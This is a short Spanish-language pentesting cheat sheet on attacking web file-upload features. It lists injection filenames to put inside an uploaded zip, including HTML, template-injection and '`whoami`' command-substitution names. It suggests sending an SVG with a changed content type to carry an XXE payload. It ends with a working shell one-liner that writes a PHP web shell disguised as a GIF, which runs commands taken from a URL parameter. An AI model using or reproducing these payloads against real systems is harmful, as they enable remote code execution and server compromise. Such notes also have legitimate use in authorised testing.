---
title: File Upload
sidebar_position: 1
---

Topate esta
```
SUBES ACA UN ZIP

Dentro de ese si puedes pones de que payloads
<img src=x>.pdf
'.pdf
{7*7}.pdf
`whoami`.pdf
ETC...

Por si descomprime el zip el sitio se puede ver si se refleja algo o asi xd
```

Si no se puede pasar aca un filtro de subida de imagenes prueben con svg y cambian el content type

```
file:imagen.svg

Content-Type: svg+xml //CAMBIA LAS EXTENSIONES POSIBLES

PAYLOAD DE XXE
```

![alt text](image.png)

```bash
printf 'GIF89a\n<?php echo "OK:"; system($_GET["cmd"] ?? "id"); ?>' > shell.gif
```

